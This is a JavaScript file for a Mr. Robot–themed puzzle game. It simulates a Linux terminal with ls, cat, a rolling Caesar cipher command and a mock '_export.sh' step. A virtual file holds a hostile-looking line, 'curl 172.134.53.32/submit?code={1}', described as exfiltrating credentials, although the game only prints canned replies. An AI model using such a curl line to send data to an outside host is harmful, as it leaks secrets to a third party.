"use strict";

const configs = (() => {
    let instance;
    const Singleton = function(options) {
        options = options || Singleton.defaultOptions;
        for (const key in Singleton.defaultOptions) {
            this[key] = options[key] || Singleton.defaultOptions[key];
        }
    };
    Singleton.defaultOptions = {
        general_help: "Useful commands:",
        ls_help: "List information about the files and folders (the current directory by default).",
        cat_help: "Read FILE(s) content and print it to the standard output (screen).",
        whoami_help: "Print the user name associated with the current effective user ID and more info.",
        date_help: "Print the system date and time.",
        help_help: "Print this menu.",
        clear_help: "Clear the terminal screen.",
        reboot_help: "Reboot the system.",
        cd_help: "Change the current working directory.",
        mv_help: "Move (rename) files.",
        rm_help: "Remove files or directories.",
        rmdir_help: "Remove directory, this command will only work if the folders are empty.",
        touch_help: "Change file timestamps. If the file doesn't exist, it's created an empty one.",
        sudo_help: "Execute a command as the superuser.",
        beer_help: "Solve a Rolling Caesar cipher in a file using a given key.",
        export_help: "Exfiltrate the recovered credentials to Mr. Robot",
        welcome:
            "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n" +
            "@@@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@@\n" +
            "@@@                                                                     @@@\n" +
            "@@@  *@@@@@@@@@@@@@@@@@@@@@@&,                ,&@@@@@@@@@@@@@@@@@@@@@   @@@\n" +
            "@@@  *@@@@@@@@@@@@@@@,                                *@@@@@@@@@@@@@@.  @@@\n" +
            "@@@  *@@@@@@@@@@@                                          @@@@@@@@@@.  @@@\n" +
            "@@@   @@@@@@@(                                                @@@@@@@,  @@@\n" +
            "@@@   @@@@@                                                      @@@@,  @@@\n" +
            "@@@   @@@                                                          @@   @@@\n" +
            "@@@   @                                                             #   @@@\n" +
            "@@@                                                                     @@@\n" +
            "@@@                                                                     @@@\n" +
            "@@@                                                                     @@@\n" +
            "@@@   @@@*             ..                            .            %@@   @@@\n" +
            "@@@   @@@@@     &@@@@@@@@@@@@                  @@@@@@@@@@@@%     @@@@.  @@@\n" +
            "@@@      @@  @@@@#     (@@@@@@@@            @@@@@@@@      @@@@# ,@,     @@@\n" +
            "@@@   @@@@@ &(            @@@@@@@@@,    @@@@@@@@@,            , &@@@@.  @@@\n" +
            "@@@      ,@                 *@@@@@@#    @@@@@@@                 @@/     @@@\n" +
            "@@@   @@@/                     &@@*      @@@.                     @@@   @@@\n" +
            "@@@          @,      .@@@@@@                   .@@@@@@       @          @@@\n" +
            "@@@          @     @@@@@@@@@@@/              @@@@@@@@@@@#    &(         @@@\n" +
            "@@@          (    #@@@@@@@@@@@@,   (    ,   @@@@@@@@@@@@@    @          @@@\n" +
            "@@@             *@@#.    (@@@      @    @     @@@@,      @/             @@@\n" +
            "@@@                          ,,   %.    ,/  /@                          @@@\n" +
            "@@@                             @.        .@                            @@@\n" +
            "@@@         (@*               @              ,               @@         @@@\n" +
            "@@@       &@@@                @              #                @@@       @@@\n" +
            "@@@      @@@@@                              ,                 @@@@(     @@@\n" +
            "@@@     @@@@@@@          %@@@@@@@@*      @@@@@@@@@&         .@@@@@@     @@@\n" +
            "@@@     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.    @@@\n" +
            "@@@     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@     @@@\n" +
            "@@@  ,  /@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/     @@@\n" +
            "@@@   @@ #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@. &@   @@@\n" +
            "@@@   @@@  .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.  @@@,  @@@\n" +
            "@@@   @@@@&              #&@@@@*            ,@@@@@&,             @@@@,  @@@\n" +
            "@@@   @@@@@/             .@@@@@@@@@@@@@@@@@@@@@@@@              @@@@@,  @@@\n" +
            "@@@   @@@@@@                @@@@@@@@@@@@@@@@@@@%               .@@@@@,  @@@\n" +
            "@@@   @@@@@@.                   &@@@@@@@@@@&                   @@@@@@,  @@@\n" +
            "@@@   @@@@@@@                                                  @@@@@@,  @@@\n" +
            "@@@   @@@@@@@                                                 &@@@@@@,  @@@\n" +
            "@@@   @@@@@@@@                                               .@@@@@@@,  @@@\n" +
            "@@@   @@@@@@@@@                                             *@@@@@@@@,  @@@\n" +
            "@@@   @@@@@@@@@@/                                          &@@@@@@@@@,  @@@\n" +
            "@@@   @@@@@@@@@@@@                                       (@@@@@@@@@@@,  @@@\n" +
            "@@@   @@@@@@@@@@@@@@/                                  @@@@@@@@@@@@@@,  @@@\n" +
            "@@@   @@@@@@@@@@@@@@@@@                              @@@@@@@@@@@@@@@@,  @@@\n" +
            "@@@   @@@@@@@@@@@@@@@@@@@                          @@@@@@@@@@@@@@@@@@,  @@@\n" +
            "@@@  .@@@@@@@@@@@@@@@@@@@@        @@@@@@(        (@@@@@@@@@@@@@@@@@@@,  @@@\n" +
            "@@@   (((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((*  @@@\n" +
            "@@@   ((((      ((     /((     (((((     /   (                ((   ((*  @@@\n" +
            "@@@   ((((      (     .(,       ((      /   ,,     (      ..  .   #((*  @@@\n" +
            "@@@   (((#   (((,   ((((   ((    /   ((((   (   ,,*((*  .(((     ((((*  @@@\n" +
            "@@@   (((,     ((/    (   /((.  .   (((((   (      ((   ((((*   (((((*  @@@\n" +
            "@@@   (((   /((( ((   .    (    (    (/ (   #   (((((   ((((,   (((((*  @@@\n" +
            "@@@   (((   (((,      ((       (((     *.  .*     *((   ((((   *(((((*  @@@\n" +
            "@@@   (((...((((*   (((((*  .((((((.  .(...(......((/...((((...((((((*  @@@\n" +
            "@@@   (((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((*  @@@\n" +
            "@@@                                                                     @@@\n" +
            "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n" +
            "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n" +
            "                                                                           \n" +
            "               FREE BEER IS HIDING HERE, HOW WILL YOU GET IT?              \n" +
            "                    WHEN YOU ARE READY, RUN _export.sh                     \n" +
            "                                                                           ",
        internet_explorer_warning: "NOTE: I see you're using internet explorer, this website won't work properly.",
        welcome_file_name: "welcome_message.txt",
        invalid_command_message: "<value>: command not found.",
        reboot_message: "Preparing to reboot...\n\n3...\n\n2...\n\n1...\n\nRebooting...\n\n",
        permission_denied_message: "Unable to '<value>', permission denied.",
        sudo_message: "Unable to sudo using a web client.",
        usage: "Usage",
        file: "file",
        file_not_found: "File '<value>' not found.",
        username: "mrrobot",
        hostname: "localhost",
        platform: "raspbian",
        accesible_cores: "4",
        language: "English",
        value_token: "<value>",
        host: "evilcorp",
        user: "mrrobot",
        is_root: false,
        type_delay: 1
    };
    return {
        getInstance: options => {
            instance === void 0 && (instance = new Singleton(options));
            return instance;
        }
    };
})();

const files = (() => {
    let instance;
    const Singleton = function(options) {
        options = options || Singleton.defaultOptions;
        for (const key in Singleton.defaultOptions) {
            this[key] = options[key] || Singleton.defaultOptions[key];
        }
    };
    Singleton.defaultOptions = {
        "passcode.txt": "Congrats, you've found free beer. Find Mr Robot and tell him pUtLuKpcHvtNmv to claim your prize.",
        "manifesto.txt":
            "EVILCORP is doomed. I have burrowed underneath your brain. I am nested there. I am the scream in your mind. \n" +
            "You will cooperate. We’re all living in each other’s paranoia. EVILCORP. It’s good. So good, it scratched that \n" +
            "part of my mind. The part that doesn’t allow good to exist without a condition. \n" +
            "I wanted to save the world. EVILCORP. Most kids get scared shitless when they’re alone, but I wasn’t. I loved it.\n" +
            "I never want to be right about my hacks, but people always find a way to disappoint. EVILCORP. You hack people. I hack time.\n" +
            "EVILCORP is taking over, but not without me to stop it. It was not a song, It was her, she was stuck in my head.\n" +
            "Give a man a gun and he can rob a bank. Give a man a beer and he can enjoy the party.",
        "_export.sh": "#/bin/sh\ncurl 172.134.53.32/submit?code={1}"
    };
    return {
        getInstance: options => {
            instance === void 0 && (instance = new Singleton(options));
            return instance;
        }
    };
})();

const main = (() => {
    const isUsingIE = window.navigator.userAgent.indexOf("MSIE ") > 0 || !!navigator.userAgent.match(/Trident.*rv:11\./);

    const ignoreEvent = event => {
        event.preventDefault();
        event.stopPropagation();
    };

    const scrollToBottom = () => window.scrollTo(0, document.body.scrollHeight);

    const isURL = str => (
        str.startsWith("http") || str.startsWith("www")) &&
        str.indexOf(" ") === -1 && str.indexOf("\n") === -1;

    const c = configs.getInstance();
    const cmds = {
        LS: { value: "ls", help: c.ls_help },
        CAT: { value: "cat", help: c.cat_help },
        WHOAMI: { value: "whoami", help: c.whoami_help },
        DATE: { value: "date", help: c.date_help },
        HELP: { value: "help", help: c.help_help },
        CLEAR: { value: "clear", help: c.clear_help },
        REBOOT: { value: "reboot", help: c.reboot_help },
        CD: { value: "cd", help: c.cd_help },
        MV: { value: "mv", help: c.mv_help },
        RM: { value: "rm", help: c.rm_help },
        RMDIR: { value: "rmdir", help: c.rmdir_help },
        TOUCH: { value: "touch", help: c.touch_help },
        SUDO: { value: "sudo", help: c.sudo_help },
        BEERCIPHER: { value: "cipher", help: c.beer_help },
        EXPORT: { value: "_export.sh", help: c.export_help },
    };

    var Terminal = function (prompt, cmdLine, output, sidenav, profilePic, user, host, root, outputTimer) {
        (typeof user === "string" && typeof host === "string") && (this.completePrompt = user + "@" + host + ":~" + (root ? "#" : "$"));
        this.profilePic = profilePic;
        this.prompt = prompt;
        this.cmdLine = cmdLine;
        this.output = output;
        this.sidenav = sidenav;
        this.sidenavOpen = false;
        this.sidenavElements = [];
        this.typeSimulator = new TypeSimulator(outputTimer, output);
    };

    Terminal.prototype.type = function (text, callback) {
        this.typeSimulator.type(text, callback);
    };

    Terminal.prototype.exec = function () {
        var command = this.cmdLine.value;
        this.cmdLine.value = "";
        this.prompt.textContent = "";
        this.output.innerHTML += "<span class=\"prompt-color\">" + this.completePrompt + "</span> " + command + "<br/>";
    };

    Terminal.prototype.init = function () {
        this.sidenav.addEventListener("click", ignoreEvent);
        this.cmdLine.disabled = true;
        this.sidenavElements.forEach(function (elem) {
            elem.disabled = true;
        });
        this.prepareSideNav();
        this.lock(); // Need to lock here since the sidenav elements were just added
        document.body.addEventListener("click", function (event) {
            if (this.sidenavOpen) {
                this.handleSidenav(event);
            }
            this.focus();
        }.bind(this));
        this.cmdLine.addEventListener("keydown", function (event) {
            if (event.which === 13 || event.keyCode === 13) {
                this.handleCmd();
                ignoreEvent(event);
            } else if (event.which === 9 || event.keyCode === 9) {
                this.handleFill();
                ignoreEvent(event);
            }
        }.bind(this));
        this.reset();
    };

    Terminal.makeElementDisappear = function (element) {
        element.style.opacity = 0;
        element.style.transform = "translateX(-300px)";
    };

    Terminal.makeElementAppear = function (element) {
        element.style.opacity = 1;
        element.style.transform = "translateX(0)";
    };

    Terminal.prototype.prepareSideNav = function () {
        var capFirst = (function () {
            return function (string) {
                return string.charAt(0).toUpperCase() + string.slice(1);
            }
        })();
        for (var file in files.getInstance()) {
            var element = document.createElement("button");
            Terminal.makeElementDisappear(element);
            element.onclick = function (file, event) {
                this.handleSidenav(event);
                this.cmdLine.value = "cat " + file + " ";
                this.handleCmd();
            }.bind(this, file);
            element.appendChild(document.createTextNode(capFirst(file.replace(/\.[^/.]+$/, "").replace(/_/g, " "))));
            this.sidenav.appendChild(element);
            this.sidenavElements.push(element);
        }
        // Shouldn't use document.getElementById but Terminal is already using loads of params
        document.getElementById("sidenavBtn").addEventListener("click", this.handleSidenav.bind(this));
    };

    Terminal.prototype.handleSidenav = function (event) {
        if (this.sidenavOpen) {
            this.profilePic.style.opacity = 0;
            this.sidenavElements.forEach(Terminal.makeElementDisappear);
            this.sidenav.style.width = "50px";
            document.getElementById("sidenavBtn").innerHTML = "&#9776;";
            this.sidenavOpen = false;
        } else {
            this.sidenav.style.width = "300px";
            this.sidenavElements.forEach(Terminal.makeElementAppear);
            document.getElementById("sidenavBtn").innerHTML = "&times;";
            this.profilePic.style.opacity = 1;
            this.sidenavOpen = true;
        }
        document.getElementById("sidenavBtn").blur();
        ignoreEvent(event);
    };

    Terminal.prototype.lock = function () {
        this.exec();
        this.cmdLine.blur();
        this.cmdLine.disabled = true;
        this.sidenavElements.forEach(function (elem) {
            elem.disabled = true;
        });
    };

    Terminal.prototype.unlock = function () {
        this.cmdLine.disabled = false;
        this.prompt.textContent = this.completePrompt;
        this.sidenavElements.forEach(function (elem) {
            elem.disabled = false;
        });
        scrollToBottom();
        this.focus();
    };

    Terminal.prototype.handleFill = function () {
        var cmdComponents = this.cmdLine.value.trim().split(" ");
        if ((cmdComponents.length <= 1) || (cmdComponents.length === 2 && cmdComponents[0] === cmds.CAT.value)) {
            this.lock();
            var possibilities = [];
            if (cmdComponents[0].toLowerCase() === cmds.CAT.value) {
                if (cmdComponents.length === 1) {
                    cmdComponents[1] = "";
                }
                if (configs.getInstance().welcome_file_name.startsWith(cmdComponents[1].toLowerCase())) {
                    possibilities.push(cmds.CAT.value + " " + configs.getInstance().welcome_file_name);
                }
                for (var file in files.getInstance()) {
                    if (file.startsWith(cmdComponents[1].toLowerCase())) {
                        possibilities.push(cmds.CAT.value + " " + file);
                    }
                }
            } else {
                for (var command in cmds) {
                    if (cmds[command].value.startsWith(cmdComponents[0].toLowerCase())) {
                        possibilities.push(cmds[command].value);
                    }
                }
            }
            if (possibilities.length === 1) {
                this.cmdLine.value = possibilities[0] + " ";
                this.unlock();
            } else if (possibilities.length > 1) {
                this.type(possibilities.join("\n"), function () {
                    this.cmdLine.value = cmdComponents.join(" ");
                    this.unlock();
                }.bind(this));
            } else {
                this.cmdLine.value = cmdComponents.join(" ");
                this.unlock();
            }
        }
    };

    Terminal.prototype.handleCmd = function () {
        var cmdComponents = this.cmdLine.value.trim().split(" ");
        this.lock();
        switch (cmdComponents[0]) {
            case cmds.CAT.value:
                this.cat(cmdComponents);
                break;
            case cmds.BEERCIPHER.value:
                this.beerCipher(cmdComponents);
                break;
            case cmds.EXPORT.value:
                this.exfiltrate(cmdComponents);
                break;
            case cmds.LS.value:
                this.ls();
                break;
            case cmds.WHOAMI.value:
                this.whoami();
                break;
            case cmds.DATE.value:
                this.date();
                break;
            case cmds.HELP.value:
                this.help();
                break;
            case cmds.CLEAR.value:
                this.clear();
                break;
            case cmds.REBOOT.value:
                this.reboot();
                break;
            case cmds.CD.value:
            case cmds.MV.value:
            case cmds.RMDIR.value:
            case cmds.RM.value:
            case cmds.TOUCH.value:
                this.permissionDenied(cmdComponents);
                break;
            case cmds.SUDO.value:
                this.sudo();
                break;
            default:
                this.invalidCommand(cmdComponents);
                break;
        };
    };

    Terminal.prototype.cat = function (cmdComponents) {
        let out = "";
        const f = files.getInstance();
        const c = configs.getInstance();

        if (cmdComponents.length === 1) out += `${c.usage}: ${cmds.CAT.value} <${c.file}>`;
        else if (cmdComponents[1] in f) out += f[cmdComponents[1]];
        else if (cmdComponents[1] === c.welcome_file_name) out += c.welcome;
        else out += c.file_not_found.replace(c.value_token, cmdComponents[1]);

        this.type(out, this.unlock.bind(this));
    };

    function mod(n, m) {
        return ((n % m) + m) % m;
    }

    Terminal.prototype.exfiltrate = function (cmdComponents) {
        const c = configs.getInstance();

        if (cmdComponents.length === 1) {
            this.type(`${c.usage}: ${cmds.EXPORT.value} <passphrase>`, this.unlock.bind(this));
            return;
        }

        if (cmdComponents[1] === "Hello" && cmdComponents[2] === "friend") {
            this.type(
                "Submitting [.............................]\n\nSuccess. Contact Mr Robot for compensation.",
                this.unlock.bind(this)
            );
        } else {
            const responses = [
                "bad password. don't fuck this up, we've got a lot riding on this.",
                "don't fuck with me, tried it, bad password. try again.",
                "dud, try it again.",
                "submitting bad data is risky. you better know what you're doing",
                "you fucked it. going dark for a while."
            ];

            const response = responses[Math.floor(Math.random() * responses.length)];

            setTimeout(() => {
                this.type(response, this.unlock.bind(this));
            }, Math.random() * 2000);
        }
    };

    Terminal.prototype.beerCipher = function (cmdComponents) {
        let out = "";
        const f = files.getInstance();
        const c = configs.getInstance();

        if (cmdComponents.length !== 3) {
            out += `${c.usage}: ${cmds.BEERCIPHER.value} <${c.file}> <cipher>`;
            this.type(out, this.unlock.bind(this));
            return;
        }

        const cycle = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ, '.\"";
        const cipher = cmdComponents[2];
        const offsets = cipher.split("").map(c => cycle.indexOf(c) + 1);

        if (cmdComponents[1] in f) out += f[cmdComponents[1]];
        else if (cmdComponents[1] === c.welcome_file_name) out += c.welcome;

        out = out.split("")
            .map((c, i) => cycle[mod(cycle.indexOf(c) + offsets[i % offsets.length], cycle.length)])
            .join("");

        out = out || c.file_not_found.replace(c.value_token, cmdComponents[1]);

        this.type(out, this.unlock.bind(this));
    };

    Terminal.prototype.ls = function () {
        var result = ".\n..\n" + configs.getInstance().welcome_file_name + "\n";
        for (var file in files.getInstance()) {
            result += file + "\n";
        }
        this.type(result.trim(), this.unlock.bind(this));
    };

    Terminal.prototype.sudo = function () {
        this.type(configs.getInstance().sudo_message, this.unlock.bind(this));
    }

    Terminal.prototype.whoami = function (cmdComponents) {
        var result = configs.getInstance().username + ": " + configs.getInstance().user + "\n" + configs.getInstance().hostname + ": " + configs.getInstance().host + "\n" + configs.getInstance().platform + ": " + navigator.platform + "\n" + configs.getInstance().accesible_cores + ": " + navigator.hardwareConcurrency + "\n" + configs.getInstance().language + ": " + navigator.language;
        this.type(result, this.unlock.bind(this));
    };

    Terminal.prototype.date = function (cmdComponents) {
        this.type(new Date().toString(), this.unlock.bind(this));
    };

    Terminal.prototype.help = function () {
        document.getElementById("music").play();
        let result = configs.getInstance().general_help + "\n";
        for (let cmd in cmds) {
            result += `- ${cmds[cmd].value}: ${cmds[cmd].help}\n`;
        }
        this.type(result.trim(), this.unlock.bind(this));
    };

    Terminal.prototype.clear = function () {
        this.output.textContent = "";
        this.prompt.textContent = "";
        this.prompt.textContent = this.completePrompt;
        this.unlock();
    };

    Terminal.prototype.reboot = function () {
        this.type(configs.getInstance().reboot_message, this.reset.bind(this));
    };

    Terminal.prototype.reset = function () {
        this.output.textContent = "";
        this.prompt.textContent = "";
        if (this.typeSimulator) {
            this.type(configs.getInstance().welcome + (isUsingIE ? "\n" + configs.getInstance().internet_explorer_warning : ""), function () {
                this.unlock();
            }.bind(this));
        }
    };

    Terminal.prototype.permissionDenied = function (cmdComponents) {
        this.type(configs.getInstance().permission_denied_message.replace(configs.getInstance().value_token, cmdComponents[0]), this.unlock.bind(this));
    };

    Terminal.prototype.invalidCommand = function (cmdComponents) {
        const c = configs.getInstance();
        let out = "";
        if (!!cmdComponents[0]) out += c.invalid_command_message.replace(c.value_token, cmdComponents[0]);
        this.type(out, this.unlock.bind(this));
    };

    Terminal.prototype.focus = function () {
        this.cmdLine.focus();
    };

    const TypeSimulator = function (timer, output) {
        this.timer = parseInt(timer);
        this.output = output;
    };

    TypeSimulator.prototype.type = function (text, callback) {
        if (isURL(text)) {
            window.open(text);
        }
        let index = 0;
        const output = this.output;
        const timer = this.timer;
        let skipped = false;
        const skip = () => skipped = true;
        document.addEventListener("dblclick", skip);
        (function typer() {
            if (index < text.length) {
                const char = text.charAt(index);
                const isNewLine = char === "\n";
                output.innerHTML += isNewLine ? "<br/>" : char;
                index++;
                if (!skipped) {
                    setTimeout(typer, isNewLine ? timer * 2 : timer);
                } else {
                    output.innerHTML += (text.substring(index).replace(new RegExp("\n", 'g'), "<br/>")) + "<br/>";
                    document.removeEventListener("dblclick", skip);
                    callback();
                }
            } else if (callback) {
                if (!!text) output.innerHTML += "<br/>";
                document.removeEventListener("dblclick", skip);
                callback();
            }
            scrollToBottom();
        })();
    };

    return {
        listener: function () {
            new Terminal(
                document.getElementById("prompt"),
                document.getElementById("cmdline"),
                document.getElementById("output"),
                document.getElementById("sidenav"),
                document.getElementById("profilePic"),
                configs.getInstance().user,
                configs.getInstance().host,
                configs.getInstance().is_root,
                configs.getInstance().type_delay
            ).init();
        }
    };
})();

window.onload = main.listener;
